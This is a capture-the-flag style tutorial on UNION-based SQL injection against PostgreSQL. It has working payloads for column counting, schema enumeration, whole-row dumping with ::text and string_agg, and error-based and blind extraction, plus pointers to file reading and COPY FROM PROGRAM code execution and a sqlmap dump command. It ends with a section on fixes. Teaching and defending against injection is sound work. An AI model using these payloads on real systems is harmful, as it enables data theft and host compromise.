# Masterclass: UNION-Based SQL Injection & Database Enumeration (PostgreSQL), From Zero

The techniques behind THE DAILY SCOOP, from first principles. Where the WAF guide (VELVET ROOM) was about *auth bypass*, this one is about the other half of SQLi: **reading arbitrary data** out of the database with `UNION`, enumerating the schema, and the Postgres-specific tricks (`::text` row casts, `string_agg`) that make exfiltration clean even when filters get in the way.

> Prereq: the dojo's **poleposition-sqli** (what SQLi is) and **sqli-waf-bypass** (bypassing filters). This builds on both.

## How to read this

- **PART 0**, how `SELECT` and `UNION` work.
- **PART 1**, the one idea.
- **PART 2**, the UNION recipe (column count, type, data).
- **PART 3**, enumerating a database.
- **PART 4**, PostgreSQL power moves (`::text`, `string_agg`, `to_jsonb`, `pg_catalog`).
- **PART 5**, blind extraction when there's no visible output.
- **PART 6**, finding it in the wild & fixes.
- Glossary + next.

---

# PART 0, The Building Blocks

A search endpoint runs something like:

```php
$q = "SELECT name FROM users WHERE name = '" . $_GET['name'] . "'";
$rows = pg_query($conn, $q);
// print each row's single column
```

It returns rows of **one column** (`name`). Your input sits inside the quotes. Escape them and you can append a second query with `UNION`.

**`UNION`** stitches the rows of two `SELECT`s into one result set:

```sql
SELECT name FROM users WHERE name='x'
UNION
SELECT 'anything'          -- ← your rows, appended to theirs
```

Rules of UNION: both sides must have the **same number of columns**, and the column **types** must be compatible. Satisfy those two and you can make the second `SELECT` read *any* table the DB user can see, and it renders in the same place the search results do.

---

# PART 1, The One Idea

> **`UNION SELECT` lets you replace "the app's query results" with "a query of your choosing," printed through the app's own output.** Match the column count and type, then select from any table.

THE DAILY SCOOP printed one column of record names; `UNION SELECT super_secret::text FROM super_secret` printed the secret table through that same slot.

---

# PART 2, The UNION Recipe

## 2.1 Confirm injection

`' OR '1'='1` returning *more* rows (or a page change) means your input alters the query. A stray `'` causing an error/different page is the first smell.

## 2.2 Find the column count

Two methods:

```sql
-- ORDER BY: increase N until it errors; last working N = column count
x' ORDER BY 1-- -      ok
x' ORDER BY 2-- -      error  → 1 column

-- or UNION with NULLs: add NULLs until no error
x' UNION SELECT NULL-- -           ok → 1 column
x' UNION SELECT NULL,NULL-- -      error
```

THE DAILY SCOOP: `ORDER BY 2` errored → **one column**.

## 2.3 Find which column is printed & its type

With multiple columns, inject a marker to see which one shows:

```sql
x' UNION SELECT 'INJ',NULL,NULL-- -
x' UNION SELECT NULL,'INJ',NULL-- -
```

Whichever position prints `INJ` is your output slot. Use a **string** marker, the output column usually needs to be text-compatible. (With one column, as here, it's trivial: `UNION SELECT 'INJ'`.)

## 2.4 Pull data

Now select real values into the printable, string-typed column.

---

# PART 3, Enumerating the Database

You rarely know table/column names, so ask the DB's own catalog. The ANSI-standard `information_schema` works on Postgres/MySQL/MSSQL:

```sql
-- current database / user / version (fingerprint)
x' UNION SELECT version()-- -
x' UNION SELECT current_database()-- -

-- tables in the public schema
x' UNION SELECT string_agg(table_name, ',') FROM information_schema.tables
     WHERE table_schema='public'-- -
-- → users,super_secret

-- columns of a table
x' UNION SELECT string_agg(column_name, ',') FROM information_schema.columns
     WHERE table_name='super_secret'-- -

-- dump the data
x' UNION SELECT string_agg(value::text, ' | ') FROM super_secret-- -
```

`string_agg(col, sep)` (Postgres) concatenates **many rows into one string**, essential when the output slot shows only a single row/cell. (MySQL: `group_concat()`; MSSQL: `STRING_AGG()` / `FOR XML PATH`.)

---

# PART 4, PostgreSQL Power Moves

These make Postgres exfil clean and filter-resistant:

## 4.1 Row-to-text cast (`::text`), no column names needed

Reference the table as a composite value and cast it:

```sql
x' UNION SELECT super_secret::text FROM super_secret-- -
-- → (1,safctf{...})      the WHOLE row serialized
```

This was the DAILY SCOOP bypass: when the `information_schema.columns` query got filtered, `super_secret::text` dumped the row **without ever naming a column**. Pair with `string_agg` for all rows:

```sql
x' UNION SELECT string_agg(super_secret::text, ' | ') FROM super_secret-- -
```

## 4.2 JSON serialization

```sql
x' UNION SELECT to_jsonb(t)::text FROM super_secret t-- -
x' UNION SELECT json_agg(t)::text FROM super_secret t-- -
```

Another whole-row dump that sidesteps column-name filters and keeps structure.

## 4.3 `pg_catalog` (when `information_schema` is blocked)

```sql
x' UNION SELECT string_agg(relname,',') FROM pg_catalog.pg_class WHERE relkind='r'-- -
x' UNION SELECT string_agg(attname,',') FROM pg_catalog.pg_attribute
     WHERE attrelid='super_secret'::regclass-- -
```

Same data, different catalog, a bypass when a filter only knows `information_schema`.

## 4.4 Type-cast errors as an oracle (error-based)

If errors reflect, force a value into an error message:

```sql
x' AND 1=CAST((SELECT value FROM super_secret LIMIT 1) AS int)-- -
-- → ERROR: invalid input syntax for integer: "safctf{...}"
```

## 4.5 Reading files / RCE (high privilege only)

If the DB role is powerful: `COPY (SELECT ...) TO`, `pg_read_file()`, or `COPY ... FROM PROGRAM` (RCE) on superuser installs. Usually blocked for app roles, but always worth checking, it escalates SQLi to host compromise.

---

# PART 5, Blind Extraction (no visible output)

When nothing reflects, extract one bit/char at a time via an observable side effect:

- **Boolean**: `... AND (SELECT substr(value,1,1) FROM super_secret)='s'` → page differs when true. Binary-search each character.
- **Time**: `... AND CASE WHEN (<cond>) THEN pg_sleep(3) ELSE pg_sleep(0) END` → response delay encodes the answer.
- **Out-of-band** (if network egress): trigger a DNS/HTTP callback carrying the data.

Tedious by hand, this is where `sqlmap` earns its keep, but know the primitive so you can confirm/trust it.

---

# PART 6, In the Wild & Fixes

## 6.1 Finding it

- Any search/filter/sort/report parameter that reaches a query. `'`, `"`, `)` to smell it; `ORDER BY`/`UNION NULL` to size it.
- Fingerprint the engine early (§3), it dictates comment syntax, catalog, and the aggregate function.
- `sqlmap -u '...lookup.php?name=1' --technique=U --dbms=postgresql --dump` once you understand the shape.

## 6.2 Fixes

1. **Parameterised queries** (`pg_query_params`, PDO prepared statements). The real fix; makes UNION injection impossible.
2. **Least-privilege DB role**, the web app shouldn't be able to `SELECT` a `super_secret` table or touch `pg_read_file`/`COPY ... PROGRAM`. Separate sensitive tables; grant narrowly.
3. **Generic errors**, don't reflect DB errors or distinguishable "starting/failed" states; they power error- and boolean-based extraction.
4. **Blocklists don't work**, `::text`, `to_jsonb`, `pg_catalog`, case/whitespace tricks all route around them.
5. **Don't leak the DSN**, keep connection strings out of the web root (DAILY SCOOP's `secrets.zip`).

---

# Glossary

- **UNION injection**, appending `UNION SELECT` to read arbitrary data through the app's output.
- **Column count / type matching**, UNION's two requirements; found via `ORDER BY` / `UNION NULL,...`.
- **information_schema / pg_catalog**, the DB's self-describing metadata; lists tables & columns.
- **`::text` cast**, Postgres composite-row-to-string; dumps a whole row without column names.
- **`string_agg` / `group_concat`**, fold many rows into one cell for single-row output slots.
- **Blind SQLi**, no visible output; extract via boolean/time/OOB oracles.

# Where to Go Next

- Build a one-column PHP+Postgres search with string concatenation; size it with `ORDER BY`, dump `information_schema`, then exfil with `::text` and `string_agg`. Rewrite with `pg_query_params` and watch it die.
- Read **sqli-waf-bypass** (VELVET ROOM) for the auth-bypass + filter-dodging half, and **exposed-files** for how the DSN leaked here.
- Try the same enumeration on MySQL (`group_concat`, `information_schema`) and MSSQL (`STRING_AGG`, error-based) to feel the engine differences.
